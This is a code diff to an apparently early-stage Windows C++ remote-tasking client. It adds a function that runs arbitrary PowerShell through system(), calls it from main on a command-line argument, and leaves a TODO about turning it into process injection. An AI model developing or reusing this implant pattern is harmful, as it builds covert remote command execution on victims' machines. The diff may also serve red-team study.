@@ -11,6 +11,9 @@
 #include <ws2tcpip.h>
 
 #include <iostream>
+#include <string>
+
+using std::string;
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment(lib, "Ws2_32.lib")
@@ -31,6 +34,7 @@ const wchar_t* ACCEPTED_MIME_TYPES[] = {
 
 // TODO: Setup server
 
+void runPSCommand(string command);
 int CreateTCPConn();
 int getHTTPTask();
 int sendHTTPTaskResult();
@@ -166,9 +170,16 @@ int CreateTCPConn(const char** argv) {
     return 0;
 }
 
+void runPSCommand(string command) {
+    string powershellPrefix{"powershell -c "};
+    system((powershellPrefix + command).c_str());
+    // TODO: Make this process injection?
+}
+
 int main(int argc, const char** argv) {
     /*TODO: Client should be able to send receive (does that mean the HTTP
      * Request needs to be async?) */
     getHTTPTask();
+    runPSCommand(argv[1]);
     return 0;
 }
